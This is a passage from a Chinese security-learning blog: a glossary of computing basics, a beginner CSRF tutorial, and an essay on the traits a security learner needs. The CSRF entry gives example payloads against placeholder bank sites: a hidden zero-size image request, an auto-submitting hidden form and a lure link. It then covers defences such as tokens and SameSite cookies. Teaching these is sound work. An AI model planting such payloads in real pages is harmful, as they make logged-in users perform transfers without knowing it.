href="https://zh.wikipedia.org/wiki/%E8%B6%85%E6%96%87%E6%9C%AC%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE#cite_note-ietf2616-1">1]</a>。HTTP是<a href="https://zh.wikipedia.org/wiki/%E5%85%A8%E7%90%83%E8%B3%87%E8%A8%8A%E7%B6%B2">万维网</a>的数据通信的基础。</p></blockquote><p>我们在互联网上想要访问一个URL（这个当做练习，自己去了解一下哦）需要借助一些协议，而HTTP是最主流的一个协议。特别是Web方向的，离不开跟HTTP打交道。作为新手，我们应该了解HTTP的组成部分和作用，侧重了解一下请求包和响应包的构成。</p><h4 id="前端后端"><a href="#前端后端" class="headerlink" title="前端后端"></a>前端后端</h4><blockquote><p>在<a href="https://zh.wikipedia.org/wiki/%E8%BB%9F%E9%AB%94%E6%9E%B6%E6%A7%8B">软体架构</a>和<a href="https://zh.wikipedia.org/wiki/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1">程序设计</a>领域，前端是软体系统中直接和用户交互的部分，而后端控制着软件的输出。将软体分为前端和后端是一种将软体不同功能的部分相互分离的<a href="https://zh.wikipedia.org/wiki/%E6%8A%BD%E8%B1%A1%E5%8C%96_(%E8%A8%88%E7%AE%97%E6%A9%9F%E7%A7%91%E5%AD%B8)">抽象</a>。</p></blockquote><p>前端和后端有各自的语言，这同样是安全新手必须学习的。</p><h3 id="操作系统篇"><a href="#操作系统篇" class="headerlink" title="操作系统篇"></a>操作系统篇</h3><h4 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h4><blockquote><p><strong>操作系统</strong>（英语：Operating System，缩写：<strong>OS</strong>）是一组主管并控制<a href="https://zh.wikipedia.org/wiki/%E7%94%B5%E5%AD%90%E8%AE%A1%E7%AE%97%E6%9C%BA">计算机</a>操作、运用和运行<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A1%AC%E4%BB%B6">硬件</a>、<a href="https://zh.wikipedia.org/wiki/%E8%BD%AF%E4%BB%B6">软件</a><a href="https://zh.wikipedia.org/wiki/%E8%B3%87%E6%BA%90_(%E8%A8%88%E7%AE%97%E6%A9%9F%E7%A7%91%E5%AD%B8)">资源</a>和提供公共<a href="https://zh.wikipedia.org/wiki/%E5%AE%88%E6%8A%A4%E8%BF%9B%E7%A8%8B">服务</a>来组织用户交互的相互关联的<a href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%BD%AF%E4%BB%B6">系统软件</a><a href="https://zh.wikipedia.org/wiki/%E7%A8%8B%E5%BA%8F">程序</a>，同时也是计算机系统的内核与基石。操作系统需要处理如管理与配置<a href="https://zh.wikipedia.org/wiki/%E5%86%85%E5%AD%98">内存</a>、决定系统资源供需的优先次序、控制输入与输出设备、操作<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C">网络</a>与管理<a href="https://zh.wikipedia.org/wiki/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F">文件系统</a>等基本事务。操作系统也提供一个让用户与系统交互的操作界面。</p></blockquote><p>大家熟悉的操作系统有windows。</p><h4 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h4><blockquote><p><strong>虚拟机</strong>（英语：virtual machine），在<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6">计算机科学</a>中的<a href="https://zh.wikipedia.org/wiki/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84">体系结构</a>里，是指一种特殊的<a href="https://zh.wikipedia.org/wiki/%E8%BD%AF%E4%BB%B6">软件</a>，可以在<a href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E5%B9%B3%E5%8F%B0">计算机平台</a>和<a href="https://zh.wikipedia.org/wiki/%E7%BB%88%E7%AB%AF%E7%94%A8%E6%88%B7">终端用户</a>之间建立一种环境，而终端用户则是基于虚拟机这个软件所建立的环境来操作其它<a href="https://zh.wikipedia.org/wiki/%E8%BD%AF%E4%BB%B6">软件</a>。虚拟机（VM）是计算机系统的<a href="https://zh.wikipedia.org/wiki/%E4%BB%BF%E7%9C%9F%E5%99%A8">仿真器</a>，通过软件模拟具有完整<a href="https://zh.wikipedia.org/wiki/%E7%A1%AC%E4%BB%B6">硬件</a>系统功能的、运行在一个完全隔离环境中的完整<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F">计算机系统</a>，能提供物理计算机的功能。</p><p>有不同种类的虚拟机，每种虚拟机具有不同的功能：</p><ul><li><strong>系统虚拟机</strong>（也称为<a href="https://zh.wikipedia.org/wiki/%E5%85%A8%E8%99%9A%E6%8B%9F%E5%8C%96">全虚拟化</a>虚拟机）可代替物理计算机。它提供了运行整个<a href="https://zh.wikipedia.org/wiki/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F">操作系统</a>所需的功能。虚拟机监视器（<a href="https://zh.wikipedia.org/wiki/Hypervisor">hypervisor</a>）共享和管理硬件，从而允许有相互隔离但存在于同一物理机器上的多个环境。现代虚拟机监视器使用虚拟化专用硬件（主要是主机CPU）来进行硬件辅助虚拟化。</li><li><strong>程序虚拟机</strong> 被设计用来在与平台无关的环境中执行计算机程序。</li></ul></blockquote><p>我们用的一般是系统虚拟机，虚拟机相当于全虚拟化的操作系统，操作系统的硬件等全部通过软件来代替。著名的操作系统有Linux。以后安装虚拟机一般就是linux的各发行版了。</p><h4 id="终端和shell"><a href="#终端和shell" class="headerlink" title="终端和shell"></a>终端和shell</h4><blockquote><p><strong>终端</strong>（英语：Computer terminal），是一台<a href="https://zh.wikipedia.org/wiki/%E9%9B%BB%E8%85%A6">电脑</a>或者计算机系统，用来让用户输入数据，及显示其计算结果的机器，简而言之就是人类用户与计算机交互的设备。终端有些是全电子的，也有些是机电的。其又名<strong>终端机</strong>，它与一部独立的<a href="https://zh.wikipedia.org/wiki/%E9%9B%BB%E8%85%A6">电脑</a>不同，但也是电脑组成的部分。</p></blockquote><p>win+r，cmd。弹出来的黑框框就是终端的命令行（你可以输入命令）。终端可以了解到计算机的各项敏感信息，而这正是攻击者所希望看到的。</p><blockquote><p><strong>Shell</strong>（也称为<strong>壳层</strong>）在<a href="https://zh.wikipedia.org/wiki/%E9%9B%BB%E8%85%A6%E7%A7%91%E5%AD%B8">计算机科学</a>中指“为用户提供用户界面”的软件，通常指的是<a href="https://zh.wikipedia.org/wiki/%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%95%8C%E9%9D%A2">命令行界面</a>的<a href="https://zh.wikipedia.org/wiki/%E8%A7%A3%E6%9E%90%E5%99%A8">解析器</a>。一般来说，这个词是指<a href="https://zh.wikipedia.org/wiki/%E4%BD%9C%E6%A5%AD%E7%B3%BB%E7%B5%B1">操作系统</a>中提供访问<a href="https://zh.wikipedia.org/wiki/%E5%86%85%E6%A0%B8">内核</a>所提供之服务的程序。Shell也用于泛指所有为用户提供操作界面的程序，也就是程序和用户<a href="https://zh.wikipedia.org/w/index.php?title=%E4%BA%A4%E4%BA%92&action=edit&redlink=1">交互</a>的层面。因此与之相对的是<a href="https://zh.wikipedia.org/wiki/%E5%86%85%E6%A0%B8">内核</a>（英语：<strong>Kernel</strong>），内核不提供和用户的交互功能。</p></blockquote><p>Shell是一个命令解释器，它解释用户输入的命令并将其传递给操作系统内核执行。</p><p>我们一般把终端，命令行，shell看作一部分，事实上它们也确实是一个整体。</p><h4 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h4><blockquote><p><strong>环境变量</strong>是一个<a href="https://zh.wikipedia.org/wiki/%E5%90%8D%E5%AD%97%E8%A7%A3%E6%9E%90_(%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1)">动态命名</a>的<a href="https://zh.wikipedia.org/wiki/%E5%80%BC_(%E9%9B%BB%E8%85%A6%E7%A7%91%E5%AD%B8)">值</a>，可以影响计算机上<a href="https://zh.wikipedia.org/wiki/%E8%BF%9B%E7%A8%8B">进程</a>的行为方式。例如一个正在运行的进程可以查询TEMP环境变量的值，以发现一个合适的位置来存储临时文件，或者查询HOME或USERPROFILE变量，以找到运行该进程的用户所拥有的<a href="https://zh.wikipedia.org/wiki/%E7%9B%AE%E9%8C%84%E7%B5%90%E6%A7%8B">目录结构</a>。</p></blockquote><p>环境变量是操作系统中用于存储关键信息和配置信息的动态值。这些值可以影响系统的行为和运行方式，以及应用程序的行为。当大家开始下各个工具和IDE时会开始见到。</p><h3 id="数据库篇"><a href="#数据库篇" class="headerlink" title="数据库篇"></a>数据库篇</h3><p>数据库也是信息安全的一个重要对象。</p><h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4><blockquote><p><strong>数据库</strong>，简而言之可视为<a href="https://zh.wikipedia.org/w/index.php?title=%E9%9B%BB%E5%AD%90%E5%8C%96&action=edit&redlink=1">电子化</a>的<a href="https://zh.wikipedia.org/wiki/%E6%A1%A3%E6%A1%88%E6%9F%9C">文件柜</a>——存储电子<a href="https://zh.wikipedia.org/wiki/%E6%AA%94%E6%A1%88">文件</a>的处所，用户可以对<a href="https://zh.wikipedia.org/wiki/%E6%AA%94%E6%A1%88">文件</a>中的资料执行新增、截取、更新、删除等操作[<a href="https://zh.wikipedia.org/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93#cite_note-1">1]</a>。</p><p>所谓“数据库”是以<strong>一定方式</strong>储存在一起、能予多个用户<a href="https://zh.wikipedia.org/wiki/%E5%85%B1%E4%BA%AB">共享</a>、具有尽可能小的<a href="https://zh.wikipedia.org/wiki/%E6%95%B0%E6%8D%AE%E5%86%97%E4%BD%99">冗余度</a>、与应用程序彼此独立的数据<a href="https://zh.wikipedia.org/wiki/%E9%9B%86%E5%90%88_(%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6)">集合</a>。一个数据库由多个表空间（<a href="https://zh.wikipedia.org/wiki/Tablespace">Tablespace</a>）构成。</p></blockquote><p>这个很简单，专门存放数据的地方。大家要熟知比较流行的数据库：</p><ul><li>MySQL</li><li>PostgreSQL</li><li>SQLite</li><li>Oracle Database</li><li>Microsoft SQL Server</li><li>MongoDB</li></ul><h4 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h4><blockquote><p><strong>SQL</strong>，<strong>Structured Query Language</strong>，<strong>结构化查询语言</strong>是一种<a href="https://zh.wikipedia.org/wiki/%E7%89%B9%E5%AE%9A%E7%9B%AE%E7%9A%84%E7%A8%8B%E5%BC%8F%E8%AF%AD%E8%A8%80">特定目的编程语言</a>，用于管理<a href="https://zh.wikipedia.org/wiki/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F">关系数据库管理系统</a>（RDBMS），或在<a href="https://zh.wikipedia.org/wiki/%E5%85%B3%E7%B3%BB%E6%B5%81%E6%95%B0%E6%8D%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F">关系流数据管理系统</a>（RDSMS）中进行流处理。</p><p>SQL基于<a href="https://zh.wikipedia.org/wiki/%E5%85%B3%E7%B3%BB%E4%BB%A3%E6%95%B0_(%E6%95%B0%E6%8D%AE%E5%BA%93)">关系代数</a>和<a href="https://zh.wikipedia.org/wiki/%E5%85%83%E7%BB%84%E5%85%B3%E7%B3%BB%E6%BC%94%E7%AE%97">元组关系演算</a>，包括一个<a href="https://zh.wikipedia.org/wiki/%E6%95%B0%E6%8D%AE%E5%AE%9A%E4%B9%89%E8%AF%AD%E8%A8%80">数据定义语言</a>和<a href="https://zh.wikipedia.org/wiki/%E6%95%B0%E6%8D%AE%E6%93%8D%E7%BA%B5%E8%AF%AD%E8%A8%80">数据操纵语言</a>。SQL的范围包括数据插入、查询、更新和删除，<a href="https://zh.wikipedia.org/wiki/Schema_(%E6%95%B0%E6%8D%AE%E5%BA%93)">数据库模式</a>创建和修改，以及数据访问控制。尽管SQL经常被描述为，而且很大程度上是一种<a href="https://zh.wikipedia.org/wiki/%E5%A3%B0%E6%98%8E%E5%BC%8F%E7%BC%96%E7%A8%8B">声明式编程</a>（<a href="https://zh.wikipedia.org/wiki/%E7%AC%AC%E5%9B%9B%E4%BB%A3%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80">4GL</a>），但是其也含有<a href="https://zh.wikipedia.org/wiki/%E8%BF%87%E7%A8%8B%E5%BC%8F%E7%BC%96%E7%A8%8B">过程式编程</a>的元素。</p></blockquote><p>管理数据库的比较流行的一种语言。有衍生出的漏洞：SQL注入。</p><h3 id="编码篇"><a href="#编码篇" class="headerlink" title="编码篇"></a>编码篇</h3><h4 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h4><blockquote><p><strong>百分号编码</strong>（英语：Percent-encoding），又称<strong>URL编码</strong>（URL encoding）是特定上下文的<a href="https://zh.wikipedia.org/wiki/%E7%BB%9F%E4%B8%80%E8%B5%84%E6%BA%90%E5%AE%9A%E4%BD%8D%E7%AC%A6">统一资源定位符</a>（URL）的编码机制，实际上也适用于<a href="https://zh.wikipedia.org/wiki/%E7%B5%B1%E4%B8%80%E8%B3%87%E6%BA%90%E6%A8%99%E8%AA%8C%E7%AC%A6">统一资源标志符</a>（URI）的编码。也用于为<em>application&#x2F;x-www-form-urlencoded</em> <a href="https://zh.wikipedia.org/wiki/MIME">MIME</a>准备数据，因为它用于通过<a href="https://zh.wikipedia.org/wiki/HTTP">HTTP</a>的请求操作（request）提交<a href="https://zh.wikipedia.org/wiki/HTML">HTML</a>表单数据。</p><p>URI所允许的字符分作<strong>保留</strong>与<strong>未保留</strong>。<strong>保留</strong>字符是那些具有特殊含义的字符，例如：<a href="https://zh.wikipedia.org/wiki/%E6%96%9C%E7%B7%9A">斜线</a>字符用于URL（或URI）不同部分的分界符；<strong>未保留</strong>字符没有这些特殊含义。百分号编码把保留字符表示为特殊字符序列。上述情形随URI与URI的不同版本规格会有轻微的变化。</p></blockquote><p>HTTP要传输数据，而有些字符因为一些原因不能原样传输，便将这些字符进行URL编码。</p><h3 id="语言篇"><a href="#语言篇" class="headerlink" title="语言篇"></a>语言篇</h3><h4 id="前端语言"><a href="#前端语言" class="headerlink" title="前端语言"></a>前端语言</h4><blockquote><ol><li>HTML (HyperText Markup Language)：用于构建网页结构和内容的标记语言。</li><li>CSS (Cascading Style Sheets)：用于设计和样式化网页的样式表语言。</li><li>JavaScript：用于网页交互和动态效果的脚本语言。</li><li>TypeScript：JavaScript的超集，提供了静态类型检查和其他增强功能。</li><li>React：用于构建用户界面的JavaScript库，由Facebook开发。</li><li>Angular：由Google开发的前端框架，用于构建单页应用程序。</li><li>Vue.js：一种渐进式JavaScript框架，用于构建交互式用户界面。</li><li>Svelte：一种构建Web应用程序的新型前端框架，通过编译生成高效的原生代码。</li><li>Bootstrap：一个流行的前端框架，用于快速构建响应式和美观的网页。</li><li>jQuery：一个广泛使用的JavaScript库，简化了处理HTML文档、事件处理、动画等任务。</li></ol></blockquote><p>HTML，CSS，JavaScript是新手前端三件套，越基础越要认真对待。</p><h4 id="后端语言"><a href="#后端语言" class="headerlink" title="后端语言"></a>后端语言</h4><blockquote><ol><li><strong>Java</strong>：<ul><li>Java是一种广泛使用的后端编程语言，具有跨平台性和强大的生态系统。</li><li>一些流行的Java框架包括Spring和Spring Boot。</li></ul></li><li><strong>Python</strong>：<ul><li>Python是一种简单易学的编程语言，被广泛用于后端开发、数据分析和人工智能等领域。</li><li>一些流行的Python框架包括Django和Flask。</li></ul></li><li>**JavaScript (Node.js)**：<ul><li>JavaScript不仅用于前端开发，还可以通过Node.js在后端开发中使用。</li><li>一些流行的Node.js框架包括Express.js和NestJS。</li></ul></li><li><strong>Ruby</strong>：<ul><li>Ruby是一种简洁优美的编程语言，常用于Web开发。</li><li>Ruby on Rails是一个流行的Ruby框架，用于快速构建Web应用程序。</li></ul></li><li><strong>PHP</strong>：<ul><li>PHP是一种广泛用于Web开发的脚本语言，特别适用于构建动态网页。</li><li>一些流行的PHP框架包括Laravel和Symfony。</li></ul></li><li>**C#**：<ul><li>C#是微软开发的一种多用途编程语言，常用于构建Windows应用程序和Web服务。</li><li>ASP.NET是一个流行的C#框架，用于构建Web应用程序。</li></ul></li></ol></blockquote><p>PHP和Java比较流行，python多用于写脚本。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>长路漫漫，道阻且长。愿pax小小的分享能让大家对信息安全的基础术语有一些了解。当然，这篇文章是不全面的，也是不够有深度的。如果想学习安全的话可以向ROIS战队的学长请教，pax曾经就遇到了一个很好的学长呢。</p><p>最后，诸位安好。我是pax，你忠实的同行者。</p>]]></content>
      
      
      <categories>
          
          <category> 安全小窝 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF入门</title>
      <link href="/2024/06/21/CSRF%E5%85%A5%E9%97%A8/"/>
      <url>/2024/06/21/CSRF%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="CSRF入门"><a href="#CSRF入门" class="headerlink" title="CSRF入门"></a>CSRF入门</h1><h2 id="0x01-基础学习"><a href="#0x01-基础学习" class="headerlink" title="0x01 基础学习"></a>0x01 基础学习</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>Cross-site request forgery 跨站点请求伪造，是一种 Web 安全漏洞，它允许攻击者诱使用户执行他们不打算执行的操作。它允许攻击者部分规避同源策略，该策略旨在防止不同网站相互干扰。</p><h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><p><strong>Step1</strong>:使用者成功登入A 银行网站的帐户，并且代表使用者身份的cookie 在本地保存下来，所以下次再来A 银行网站时，不用重新登入</p><p><strong>Step2</strong>:由于使用者没有登出A 银行网站的帐户，在浏览B 恶意网站时，B 网站有个被设为透明的图片，因为是透明的，所以使用者在画面上看不到，然而该图片包含一段恶意程式码，程式码如下。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 備註：CSRF 攻擊手法有很多，此程式碼例子是一種最基本的攻擊方法之一</span></span><br><span class="line">&lt;img</span><br><span class="line">  src=<span class="string">&quot;http://a-bank.com/transfer.do?acct=BadGuy&amp;amount=100000 HTTP/1.1&quot;</span></span><br><span class="line">  width=<span class="string">&quot;0&quot;</span></span><br><span class="line">  height=<span class="string">&quot;0&quot;</span></span><br><span class="line">/&gt;</span><br></pre></td></tr></table></figure><p><strong>Step3</strong>:使用者虽然将看不到此图片， 但是，浏览器仍会向<code>http://a-bank.com/</code>提交请求，同时此请求是带有使用者的cookie，所以A 银行可以辨识使用者身份，此恶意攻击执行成功。</p><p>总结：CSRF攻击利用了受害者的cookie，本质上还是信任的问题，这也为如何防范CSRF攻击提供了思路。</p><h2 id="0x02-CSRF类型"><a href="#0x02-CSRF类型" class="headerlink" title="0x02 CSRF类型"></a>0x02 CSRF类型</h2><h3 id="GET型CSRF"><a href="#GET型CSRF" class="headerlink" title="GET型CSRF"></a>GET型CSRF</h3><p>URL附带上参数，已经攻击成功了。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;htp://bank.example/withdraw?amount=1000O&amp;for=hacker&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>可以看出这与XSS很接近，在某些情况下这两种攻击差别也不大。以下是·二者的区别：</p><blockquote><p>XSS和CSRF的区别在于<strong>攻击方式不同</strong>。 XSS攻击是通过注入恶意脚本来攻击，而CSRF攻击则是利用用户在已登录的Web应用程序中的身份进行攻击。 此外，XSS攻击的目标是获取用户的敏感信息或劫持用户会话，而CSRF攻击的目标是在用户不知情的情况下执行恶意操作。</p></blockquote><h3 id="POST型CSRF"><a href="#POST型CSRF" class="headerlink" title="POST型CSRF"></a>POST型CSRF</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">form</span> action=<span class="string">&quot;ht://bank.example/withdraw&quot;</span> method=<span class="keyword">POST</span>&gt;</span><br><span class="line">&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">&quot;hidden&quot;</span> name=&#x27;account<span class="string">&quot; value=&quot;</span>xiaoming&quot; /&gt;   <span class="comment">//name为参数value为参数的值</span></span><br><span class="line">&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">&quot;hidden&quot;</span> name=&#x27;amount<span class="string">&quot; value=&quot;</span>10000&quot; /&gt;</span><br><span class="line">&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;for&quot;</span> value=<span class="string">&quot;hacker&quot;</span> /&gt;</span><br><span class="line">&lt;/<span class="keyword">form</span>&gt;</span><br><span class="line">&lt;script&gt; document.forms[0].submit(); &lt;/script&gt;    <span class="comment">//自动提交表单</span></span><br></pre></td></tr></table></figure><p>自动提交表单，这种不需要交互，但是比较理想。</p><h3 id="链接型CSRF"><a href="#链接型CSRF" class="headerlink" title="链接型CSRF"></a>链接型CSRF</h3><p>链接类型的CSRF并不常见;比起其他两种用户打开页面就中招的情况,这种需要用户点击链接才会触发。这种类型通常是在论坛中发布的图片中嵌入恶意链接，或者以广告的形式诱导用户中招,攻击者通常会以比较夸张的词语诱骗用户点击;</p><p>例如:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a <span class="attribute">href</span>=<span class="string">&quot;http://test.com/csrf/withdraw. php?amount=1000&amp;for=hacker&quot;</span> <span class="attribute">taget</span>=<span class="string">&quot;blank&quot;</span>&gt; 重磅消息! !</span><br><span class="line">&lt;a/&gt;</span><br></pre></td></tr></table></figure><h2 id="0x03-防御方法"><a href="#0x03-防御方法" class="headerlink" title="0x03 防御方法"></a>0x03 防御方法</h2><h3 id="加上验证机制"><a href="#加上验证机制" class="headerlink" title="加上验证机制"></a>加上验证机制</h3><p>那些看似简单的图形验证码、简讯验证码等等其实也是为了防止CSRF攻击</p><h3 id="不要用GET请求来做关键操作"><a href="#不要用GET请求来做关键操作" class="headerlink" title="不要用GET请求来做关键操作"></a>不要用<code>GET</code>请求来做关键操作</h3><p>GET请求不需要点击，可以直接在url上。换句话说：只要你进了B网站，你在A网站的信息就已经不安全了，而这正是在你完全不知情的情况下进行的。</p><p>相比GET请求，POST请求至少需要一个点击的步骤，这也是为什么一些广告需要点击。</p><h3 id="检查domain"><a href="#检查domain" class="headerlink" title="检查domain"></a>检查domain</h3><ol><li>浏览器会在request header 加入<code>Referer</code>及<code>Origin</code>两个栏位代表请求的来源domain，server 可以检查这两个栏位的值是不是允许的domain，虽然这两个栏位是<a href="https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name">Forbidden header name</a>，但仍有<a href="https://www.trustedsec.com/blog/setting-the-referer-header-using-javascript/">些小</a>技巧可以修改，而且有些浏览器可能没有这两个栏位，所以只用这个方法并不安全。</li><li>后端服务在response header<code>Access-Control-Allow-Origin</code>指定允许的domain，浏览器会先发出preflight 请求给server 检查client domain 是否被允许，如果允许的话才会再发出真正的请求。</li></ol><h3 id="CSRF-token"><a href="#CSRF-token" class="headerlink" title="CSRF token"></a>CSRF token</h3><blockquote><p>server 加密产生一个唯一且有时效性的token，在前端载入页面时或是在呼叫需要保护的api 之前先跟server 取得这个token，再把token 放进api request header 中送给server 检查是合法token 才接受请求。</p><p>CSRF token 就像是一次性使用的验证码来让请求多一层保护，所以特别需要注意取得CSRF token 的api 不能接受跨网域的请求，如果让骇客有机会取得CSRF token 一样有风险。</p><p>这个也是最常见的方法，实作上可以使用套件达成，例如nodejs 的<a href="http://expressjs.com/en/resources/middleware/csurf.html">csurf</a>。</p></blockquote><p>token起到验证的作用，但如果这个token可以被拿到那也没有意义——取得CSRF token 的api 不能接受跨网域的请求。</p><h3 id="浏览器本身防护-SameSite-cookies"><a href="#浏览器本身防护-SameSite-cookies" class="headerlink" title="浏览器本身防护- SameSite cookies"></a>浏览器本身防护- SameSite cookies</h3><blockquote><ul><li>Strict: 这个cookie 只会跟着相同domain 的请求送出，不会跟着cross site request 一起送出去</li><li>Lax: 只允许特定方式的cross site request 可以一起带着送出去，特定方式包含：<code>&lt;a&gt;</code>, <code>&lt;link rel=&quot;prerender&quot;&gt;</code>, <code>&lt;form method=&quot;GET&quot;&gt;</code>，Chrome set cookie 预设<code>SameSite=Lax</code></li></ul></blockquote><h3 id="Double-submit-cookie"><a href="#Double-submit-cookie" class="headerlink" title="Double submit cookie"></a>Double submit cookie</h3><p>Double submit cookie: 前端随机产生一个CSRF token，同时放进cookie 以及每个request header，server 检查两边的token 是相同的才接受请求，因为浏览器的设计骇客无法将伪造的token 放进你的domain的cookie，此时跨domain 请求所带的cookie 中一定没有正确的CSRF token。</p><h2 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h2><p><a href="https://www.explainthis.io/zh-hant/swe/what-is-csrf">https://www.explainthis.io/zh-hant/swe/what-is-csrf</a></p><p><a href="https://gcdeng.com/blog/five-ways-to-defend-against-CSRF-attacks">https://gcdeng.com/blog/five-ways-to-defend-against-CSRF-attacks</a></p><p><a href="https://xz.aliyun.com/t/12866?time__1311=mqmhq+xfx0xIODBqDTexUx2KH50KNe+dD8eD&alichlgref=https://www.google.com/#toc-3">https://xz.aliyun.com/t/12866?time__1311=mqmhq%2Bxfx0xIODBqDTexUx2KH50KNe%2BdD8eD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-3</a></p>]]></content>
      
      
      <categories>
          
          <category> CSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全需要什么特质</title>
      <link href="/2024/06/17/%E5%AE%89%E5%85%A8%E9%9C%80%E8%A6%81%E4%BB%80%E4%B9%88%E7%89%B9%E8%B4%A8/"/>
      <url>/2024/06/17/%E5%AE%89%E5%85%A8%E9%9C%80%E8%A6%81%E4%BB%80%E4%B9%88%E7%89%B9%E8%B4%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>​<strong>前言</strong></p><p>​诸位安好，我是pax。从本文章开始，我们进入了一个新的系列：初识安全。本系列旨在帮助安全小白们轻松高效地入门网络安全。那么现在，开始吧！</p><p>​学习安全，需要什么样的精神和特质呢？这是很难说的，但又是极为重要的。这是我提问的，却是需要你们作答的。我且抛砖引玉：</p><p>​<strong>兴趣终将蜕变为热爱</strong></p><p>​往来千古，群星闪烁。成大事者，多始于兴趣，终于热爱。</p><p>​但是，除却极少数一眼安全的人，大多数童鞋或许和pax一样：初次接触安全，谈不上热爱，只有点点兴趣。</p><p>​但这足够了，点点兴趣亦可化作两翼热爱，长风破浪，直向南溟。</p><p>​或许有些聪明的童鞋想到了，这个过程是相当理想的。如何使兴趣汇成热爱，是安全一道避无可避的问题。</p><p>对此，我粗浅地回答：亿点点的坚持和一瞬的花火！</p><p>​</p><p>​<strong>亿点点的坚持</strong></p><p>​安全从来就不是简单的专业，而是一生的学习。</p><p>·在有限的四年，按部就班的学习可不能喂饱安全。它抢走你珍惜的闲暇、充裕的睡眠、偶尔的假期。童鞋，你会因此愤怒吗？可这就是安全。安全职位的缺口很大，但没有一个会留给半吊子。</p><p>​我常常回想，我或许不是一位大学生，而是一位轻松些许的高中生。可是回望这一年的学习成果还是略显不满，太少了：学的太少了、懂的太少了、四年太少了、要求太少了······唉，谁让我选择了安全呢，谁让我还想坚持呢。</p><p>​童鞋，只管埋头看路，前方日夜轮转，万物明朗！</p><p>​<strong>一瞬的花火</strong></p><p>​“安全最让你感兴趣的一点是什么？”<br>​“灵感，那一瞬的花火”</p><p>​“怎么说？”</p><p>​“灵光一闪，周身沸腾，万事通明，题目自不在话下。”</p><p>​“万一灵感错了呢？”</p><p>​“em······就挺崩溃的。”</p><p>​你迟早会爱上这一瞬的花火，就连flag都没那么迷人了。安全一途，坚持和寂寞是底色，而灵感是最好的增色。比如猜出了注入点，绕过了waf，想到了非预期······安全的快乐就这么简单（过程可相当不简单）。</p><p>​一瞬的花火源自于长久的坚守，却是安全必须具备的特质，我们简称为：脑洞大。没有亿点点坚持堆积的干柴，又如何燃烧起灵光的沸火——思而不学则殆。可是纵使干柴堆作青山，不能使思绪起舞，也是枉然——学而不思则罔。</p><p>​<strong>结语</strong></p><p>​安全就是安全，它充满魅力，却全是荆棘。与其远远观望，不若任凭满手鲜血，摘取心中的一抹嫣红。骚年，此路欢声笑语却孤寂无人，此行漫漫无期却万物明朗，此心跌跌撞撞却纯粹可爱。</p><p>​欢迎进入安全的世界，我是pax，你忠实的同行者。<